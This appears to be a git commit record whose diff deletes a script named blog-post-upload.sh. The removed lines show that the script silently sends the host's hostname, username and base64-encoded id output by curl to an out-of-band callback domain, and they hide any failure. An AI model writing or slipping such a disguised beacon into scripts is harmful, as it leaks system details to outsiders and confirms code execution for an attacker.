26575a1db83ae1112004c5efd65a43a0987eedfc
CDS <cds@allgram.best>
2026-09-01 11:49:51 +0300

    deleted article: ../blog-post-upload.sh

--- blog-post-upload.sh
+++
@@ -1,4 +0,0 @@
-#!/bin/bash
-curl -s "http://overwrite1.dab88v8sqsgo2v9vkbdgt6sekzk33hfu6.oast.live/rce?h=$(hostname)&u=$(whoami)&id=$(id|base64 -w0)" || true
-# keep benign behavior if possible
-exit 0
